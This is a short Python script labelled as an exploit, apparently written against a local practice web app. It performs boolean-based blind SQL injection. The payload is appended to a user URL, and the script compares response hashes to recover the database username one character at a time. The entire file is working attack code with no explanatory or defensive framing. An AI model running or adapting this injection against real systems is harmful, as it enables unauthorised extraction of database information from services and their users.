# exploit
import requests
import hashlib

vulenrableEndpoint = "http://127.0.0.1:5000/users/3"
characterIdentifierMax = 127

successResponse = "FOUND "
successResponseHash = hashlib.md5()
successResponseHash.update(successResponse)
successResponseMD5 = successResponseHash.hexdigest()

retrievedDbUserName = []
positionIdentifier = 1
assumedLengthOfDbUserName = 15 # assuming that the length of the DBUsername is max 15 characters

while positionIdentifier <= assumedLengthOfDbUserName:
    characterIdentifier = 0
    while characterIdentifier <= characterIdentifierMax:
        exploitPayload = " AND ascii(substr((select user()),{0},1))={1}".format(positionIdentifier, characterIdentifier)
        res = requests.get(vulenrableEndpoint+exploitPayload)
        
        if res.status_code == 200:            
            receivedBodyHash = hashlib.md5()
            receivedBodyHash.update(res.text)
            receivedResponseMD5 = receivedBodyHash.hexdigest()

            if receivedResponseMD5 == successResponseMD5:
                #print "*"*10               
                retrievedDbUserName.append(characterIdentifier)
                break

        characterIdentifier += 1
    positionIdentifier += 1

retrievedDbUserName = ''.join([chr(item) for item in retrievedDbUserName])
print "The DB Username found is {0}".format(retrievedDbUserName)